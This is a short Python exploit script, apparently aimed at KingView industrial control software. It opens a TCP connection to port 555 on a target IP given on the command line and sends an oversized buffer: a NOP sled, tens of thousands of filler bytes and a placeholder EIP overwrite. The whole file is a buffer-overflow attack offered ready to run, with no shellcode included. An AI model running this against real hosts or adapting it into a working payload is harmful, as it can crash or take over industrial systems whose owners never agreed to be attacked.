#!/usr/bin/python3

import socket
import sys

if len(sys.argv) != 2:
    print("Usage: python3 kingview_exploit.py <IP>")
    sys.exit(1)

host = sys.argv[1]
port = 555

# Exploit payload
exploit = b"\x90" * 1024  # NOP sled
exploit += b"A" * 23976
exploit += b"B" * 12500
exploit += b"D" * 6250
exploit += b"E" * 6002
exploit += b"\x44\x43\x42\x41"  # Overwrite EIP
exploit += b"\x90" * 256  # Additional NOP sled

try:
    print("\n[+] Connecting to target...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print("[+] Sending exploit payload...")
    s.send(exploit)
    data = s.recv(1024)
    print("[+] Response received:", data)
except Exception as e:
    print(f"[-] Error: {e}")
finally:
    print("[+] Closing connection...")
    s.close()
    print("[+] Done!")